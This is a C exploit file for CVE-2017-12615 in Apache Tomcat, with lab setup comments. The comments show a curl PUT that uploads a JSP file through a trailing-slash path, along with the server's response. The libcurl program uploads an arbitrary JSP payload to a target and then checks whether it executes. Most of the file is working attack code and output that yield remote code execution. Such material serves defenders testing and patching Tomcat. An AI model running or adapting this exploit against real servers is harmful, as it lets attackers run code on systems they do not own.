// name  : Apache Tomcat Remote Code Execution via JSP upload
// cve   : CVE-2017-12615
// author: Nixawk


// ## [Lab] CVE-2017-12615

// 1. create a docker containter baseed on tomcat 7.0.81
// 2. disable [readonly] settings in [conf/web.xml]. 

//     Add the following contents into [conf/web.xml] (It may be the first part.)

//             <init-param>
//                 <param-name>readonly</param-name>
//                 <param-value>false</param-value>
//             </init-param>

// 3. Pwn the lab with curl.

//     $ curl -v -X PUT http://127.0.0.1:32770/test.jsp/ --data "<% out.println(1 + 2); %>"
//     *   Trying 127.0.0.1...
//     * TCP_NODELAY set
//     * Connected to 127.0.0.1 (127.0.0.1) port 32770 (#0)
//     > PUT /test.jsp/ HTTP/1.1
//     > Host: 127.0.0.1:32770
//     > User-Agent: curl/7.54.0
//     > Accept: */*
//     > Content-Length: 25
//     > Content-Type: application/x-www-form-urlencoded
//     >
//     * upload completely sent off: 25 out of 25 bytes
//     < HTTP/1.1 201 Created
//     < Server: Apache-Coyote/1.1
//     < Content-Length: 0
//     < Date: Thu, 21 Sep 2017 06:42:13 GMT
//     <
//     * Connection #0 to host 127.0.0.1 left intact


//     $ curl http://127.0.0.1:32770/test.jsp
//     3

// 4. develop a c module.
// 5. compile:  $ gcc -o exploit cve-2017-12615.c -lcurl

// 6. exploit

        // ./cve-2017-12615 

        //     ----------------------------------------------------------
        //     name  : Apache Tomcat Remote Code Execution via JSP upload
        //     cve   : CVE-2017-12615
        //     ----------------------------------------------------------

        // [+] vulnerable - http://example.com/test.jsp


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <curl/curl.h>

typedef struct string {
    char *ptr;
    size_t len;
} string_t;


void welcome(void);
void exploit(char *, char *);
bool is_vulnerable(char *url, char *flag);

void init_string(string_t *s);
size_t writefunc(void *, size_t , size_t , string_t *);

void
init_string(string_t *s) {
    s->len = 0;
    s->ptr = malloc(s->len+1);

    if (s->ptr == NULL) {
        fprintf(stderr, "malloc() failed\n");
        exit(EXIT_FAILURE);
    }
    s->ptr[0] = '\0';
}


size_t
writefunc(void *ptr, size_t size, size_t nmemb, string_t *s)
{
    size_t new_len = s->len + size*nmemb;
    
    s->ptr = realloc(s->ptr, new_len+1);
    if (s->ptr == NULL) {
        fprintf(stderr, "realloc() failed\n");
        exit(EXIT_FAILURE);
    }
 
    memcpy(s->ptr+s->len, ptr, size*nmemb);
    s->ptr[new_len] = '\0';
    s->len = new_len;

    return size*nmemb;
}


void
welcome(void)
{
    printf("\n\t----------------------------------------------------------\n");
    printf("\tname  : Apache Tomcat Remote Code Execution via JSP upload\n");
    printf("\tcve   : CVE-2017-12615\n");
    printf("\t----------------------------------------------------------\n\n");
}


void
exploit(char *url, char *filename)
{

    FILE *payload;
    CURL *curl;
    CURLcode res;
    
    payload = fopen(filename, "r");
    if (payload == NULL)
    {
        fprintf(stderr, "fopen() failed: open file:  %s\n", filename);
    exit(0);
    }

    curl = curl_easy_init();
    if (curl)
    {
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
        // curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
        curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
        curl_easy_setopt(curl, CURLOPT_READDATA, (FILE *)payload);

        /* perform the request, res will get the return code */
        res = curl_easy_perform(curl);
        /* check for errors */
        if (res != CURLE_OK)
        {
            fprintf(stderr, "curl_easy_perform() failed: %s\n",
                    curl_easy_strerror(res));
        }
        /* always cleanup */
        curl_easy_cleanup(curl);
    }

    fclose(payload);
}


bool
is_vulnerable(char *url, char *flag)
{
    bool ret = false;

    CURL *curl;
    CURLcode res;

    string_t s;
    init_string(&s);

    curl = curl_easy_init();
    if (curl)
    {
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
        // curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writefunc);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &s);

        /* perform the request, res will get the return code */
        res = curl_easy_perform(curl);
        /* check for errors */
        if (res != CURLE_OK)
        {
            fprintf(stderr, "curl_easy_perform() failed: %s\n",
                    curl_easy_strerror(res));
        }
        /* check if target is vulnerable */
        if(strstr(s.ptr, flag) != NULL) {
            ret = true;
        }
            /* always cleanup */
            free(s.ptr);
            curl_easy_cleanup(curl);
        }

    return ret;
}

int
main(int argc, const char *argv[])
{
    welcome();

    char *upload_url = "http://example.com/test.jsp/";
    char *access_url = "http://example.com/test.jsp";
    char *filename = "test.txt";         // <% out.println("pwned->" + "cve-201712615"); %>
    char *flag = "pwned->cve-201712615"; // output: 3

    exploit(upload_url, filename);
    if (is_vulnerable(access_url, flag))
        printf("[+] vulnerable - %s\n", access_url);

    return 0;
}


// References
// https://stackoverflow.com/questions/7569826/send-string-in-put-request-with-libcurl
// https://curl.haxx.se/libcurl/c/CURLOPT_UPLOAD.html
// https://cboard.cprogramming.com/c-programming/162729-libcurl-put-request.html
// https://stackoverflow.com/questions/2329571/c-libcurl-get-output-into-a-string
// https://stackoverflow.com/questions/12784766/check-substring-exists-in-a-string-in-c
